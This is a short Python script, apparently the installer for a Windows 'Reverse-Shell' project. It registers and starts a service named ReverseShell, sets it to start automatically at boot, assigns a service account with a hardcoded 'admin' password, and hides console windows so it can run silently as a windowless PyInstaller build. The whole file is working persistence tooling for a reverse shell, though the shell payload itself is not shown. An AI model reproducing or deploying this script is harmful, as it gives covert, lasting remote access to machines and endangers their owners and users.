import time
import subprocess
import os


def popen(cmd: str) -> str:
    """For pyinstaller -w"""
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    process = subprocess.Popen(cmd, startupinfo=startupinfo, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
    return process.stdout.read()


def main():
    try:
        # Change directory to 'Desktop'.
        os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop"))
        os.chdir("Reverse-Shell")
        cmd = "python service.py install"
        p = popen(cmd)
        print(p)
        cmd = "python service.py update"
        p = popen(cmd)
        print(p)
        cmd = "sc config ReverseShell start=auto"
        p = popen(cmd)
        print(p)
        # This command is only needed in my windows server 2016 VM.
        cmd = r"sc config ReverseShell obj= WINDEV1911EVAL\User password= admin type= own"
        p = popen(cmd)
        print(p)
        cmd = "net start ReverseShell"
        p = popen(cmd)
        print(p)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
